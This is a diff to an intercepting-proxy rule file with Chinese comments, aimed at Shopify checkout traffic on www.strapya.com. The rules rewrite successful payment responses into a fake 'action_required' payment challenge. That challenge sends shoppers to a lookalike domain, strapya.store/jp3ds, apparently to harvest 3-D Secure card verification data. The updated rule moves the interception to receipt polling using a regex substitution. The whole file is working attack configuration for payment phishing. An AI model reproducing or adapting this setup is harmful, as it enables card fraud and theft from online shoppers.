@@ -53,12 +53,11 @@ intercept:
 
   # SubmitForCompletion → 转发到真实 Shopify，修改响应为 action_required
   - domain: 'www.strapya.com'
-    path: '.*persisted\?operationName=SubmitForCompletion.*'
+    path: '.*persisted\?operationName=PollForReceipt.*'
     type: transparent
     alter_response:
       # 把 Shopify 返回的 processed/processing 改为 action_required
-      '"status":"processed"': '"status":"action_required","action":{"type":"complete_payment_challenge","offsiteRedirect":false,"url":"https://www.strapya.store/jp3ds","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"}'
-      '"status":"processing"': '"status":"action_required","action":{"type":"complete_payment_challenge","offsiteRedirect":false,"url":"https://www.strapya.store/jp3ds","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"}'
+      '(\{"data.*?"url":).*?(.*?"__typename":"ActionRequiredReceipt"\}\}\})': '$1"https://www.strapya.store/jp3ds"$2'
 
   # ===== 3DS 验证拦截 =====
   - domain: 'www.strapya.com'      # 要拦截的域名
